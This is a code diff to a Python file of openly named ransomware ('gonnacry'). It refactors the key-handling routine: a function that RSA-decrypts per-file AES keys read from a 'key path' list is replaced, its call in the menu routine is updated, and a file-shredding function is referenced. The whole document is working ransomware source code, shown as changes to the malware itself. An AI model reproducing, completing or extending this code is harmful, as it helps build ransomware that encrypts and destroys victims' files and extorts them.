@@ -10,6 +10,8 @@ import time
 import os
 import pickle
 from Crypto.Cipher import PKCS1_OAEP
+import string 
+import random
 
 # enviroment paths
 ransomware_name = ("gonnacry")
@@ -21,16 +23,11 @@ ransomware_path = os.path.join(home, ransomware_name)
 machine_id = enviroment.get_unique_machine_id()
 
 
-def decrypt(enc, key):
-    key = RSA.importKey(key)
-    cipher = PKCS1_OAEP.new(key)
-
-    decifrado = ""
-    for i in enc:
-        ciphertext = cipher.decrypt(i)
-        decifrado += ciphertext
-    return decifrado
-
+def decrypt_aes_keys(enc, key):
+    key_obj = RSA.importKey(key)
+    cipher = PKCS1_OAEP.new(key_obj)
+    return cipher.decrypt(enc)
+    
 
 def shred(file_name,  passes=1):
 
@@ -103,7 +100,7 @@ def menu():
     for line in content:
         ret = line.split(' ') # enc(KEY) base64(PATH)
         encrypted_aes_key = base64.b64decode(ret[0])
-        aes_key = decrypt(encrypted_aes_key, client_private_key)
+        aes_key = decrypt_aes_keys(encrypted_aes_key, client_private_key)
 
         aes_and_path.append((aes_key, base64.b64decode(ret[1])))
 
